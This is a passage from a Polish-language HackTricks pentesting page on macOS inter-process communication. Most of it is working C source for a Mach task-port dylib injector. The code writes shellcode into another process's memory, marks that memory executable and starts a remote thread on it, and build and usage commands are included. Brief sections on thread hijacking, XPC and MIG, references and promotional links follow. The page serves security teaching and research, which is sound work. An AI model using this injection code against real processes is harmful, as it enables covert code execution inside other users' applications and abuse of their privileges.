if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Nie można ustawić uprawnień pamięci dla kodu zdalnego wątku: Błąd %s\n", mach_error_string(kr));
return (-4);
}

// Ustawienie uprawnień na przydzielonej pamięci stosu
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Nie można ustawić uprawnień pamięci dla stosu zdalnego wątku: Błąd %s\n", mach_error_string(kr));
return (-4);
}


// Utworzenie wątku do uruchomienia shellcode'u
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // to jest prawdziwy stos
//remoteStack64 -= 8;  // potrzebne wyrównanie do 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Stos zdalny 64  0x%llx, Kod zdalny to %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Nie można utworzyć zdalnego wątku: błąd %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Użycie: %s _pid_ _akcja_\n", argv[0]);
fprintf (stderr, "   _akcja_: ścieżka do dylib na dysku\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib nie znaleziony\n");
}

}
```
</szczegóły>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Przechwytywanie wątku za pomocą portu zadania <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

W tej technice przechwytywany jest wątek procesu:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Podstawowe informacje

XPC, co oznacza komunikację międzyprocesową XNU (jądro używane przez macOS), to framework do **komunikacji między procesami** na macOS i iOS. XPC zapewnia mechanizm do **bezpiecznych, asynchronicznych wywołań metod między różnymi procesami** w systemie. Jest to część paradygmatu bezpieczeństwa Apple, pozwalająca na **tworzenie aplikacji z podziałem uprawnień**, gdzie każdy **komponent** działa tylko z **niezbędnymi uprawnieniami** do wykonania swojej pracy, ograniczając potencjalne szkody pochodzące od skompromitowanego procesu.

Aby uzyskać więcej informacji na temat tego, jak ta **komunikacja działa** i jak **może być podatna**, sprawdź:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Generator interfejsu Mach

MIG został stworzony, aby **uproszczać proces tworzenia kodu IPC Mach**. W zasadzie **generuje wymagany kod** do komunikacji między serwerem a klientem z daną definicją. Nawet jeśli wygenerowany kod jest brzydki, programista będzie musiał go tylko zaimportować, a jego kod będzie znacznie prostszy niż wcześniej.

Aby uzyskać więcej informacji, sprawdź:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Odnośniki

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

{% hint style="success" %}
Ucz się i praktykuj Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i praktykuj Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
